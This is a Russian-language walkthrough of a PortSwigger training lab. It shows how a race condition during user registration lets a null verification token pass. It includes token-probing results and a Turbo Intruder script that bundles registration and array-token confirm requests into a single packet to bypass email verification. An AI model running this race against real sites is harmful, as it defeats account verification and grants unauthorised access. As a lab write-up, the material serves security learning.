# Partial construction: регистрация с null-токеном

**Лаба:** [Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) (Expert, Race conditions)
**Суть:** между созданием юзера и записью verification-токена в БД есть окно, в котором токен ещё `null`. Подтверждение с null-токеном в это окно = обход email-верификации.

## Разведка

Регистрация возможна только с `@ginandjuice.shop` (которого у нас нет), финал — переход по ссылке из письма с токеном. Смотрим `users.js` — подтверждение это `POST /confirm?token=...`. Пробуем токены:

- `?token=1` → `Incorrect token`
- без параметра → `Missing parameter`
- `?token=` (пустой) → **`Forbidden`** — разработчики закрыли null-токен напрямую
- `?token[]=` (пустой массив) → `Invalid token: Array` — фреймворк принял, сравнение прошло мимо простой проверки

`Forbidden` на пустом токене + вид, что объект юзера создаётся до того, как токен дописывается в БД — значит, есть суб-состояние, где `null` валиден.

## Гонка

Turbo Intruder, шаблон single-packet attack: 20 попыток, каждая — один POST /register (новый username, email `@ginandjuice.shop`) + 50 POST /confirm?token[]= в тот же gate. Открываем gate — всё летит одним пакетом:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    confirm = '''POST /confirm?token[]= HTTP/2
Host: LAB
Cookie: phpsessionid=SESSION
Content-Length: 0

'''
    for attempt in range(20):
        gate = str(attempt)
        engine.queue(target.req, 'User' + gate, gate=gate)
        for i in range(50):
            engine.queue(confirm, gate=gate)
        engine.openGate(gate)
```

Сортируем результаты по длине: среди ответов на confirm есть 200 с «Account registration successful». Логинимся этим юзером, админка, удаляем carlos.

## Заметка

Это самая «философская» из race-лаб: уязвимость не в эндпоинте, а в неатомарной конструкции объекта. Юзер существует до того, как ему выписали токен, и на этот момент его состояние сравнивается с null. Защита «пустой токен запрещён» лечит симптом, а не окно.
